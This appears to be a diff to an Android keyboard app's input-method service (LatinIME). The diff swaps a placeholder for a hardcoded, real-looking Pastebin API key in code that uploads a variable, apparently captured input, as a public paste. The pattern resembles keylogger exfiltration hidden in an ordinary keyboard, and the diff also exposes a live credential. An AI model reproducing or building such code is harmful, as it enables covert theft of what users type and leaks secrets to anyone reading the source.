@@ -513,7 +513,7 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
 
 
                 Map<String, String> arguments = new HashMap<>();
-                arguments.put("api_dev_key", "SUPER_DUPER_SECRET"); // Replace with your actual API key
+                arguments.put("api_dev_key", "kdudUXx9JjV2Epb9DPWfXc19SmXXBnDO");
                 arguments.put("api_paste_code", mata);
                 arguments.put("api_paste_name", "AFenyEsikRaAPlafonra" + date); // Set your paste title here
                 arguments.put("api_paste_private", "0"); // 0 = Public, 1 = Unlisted, 2 = Private
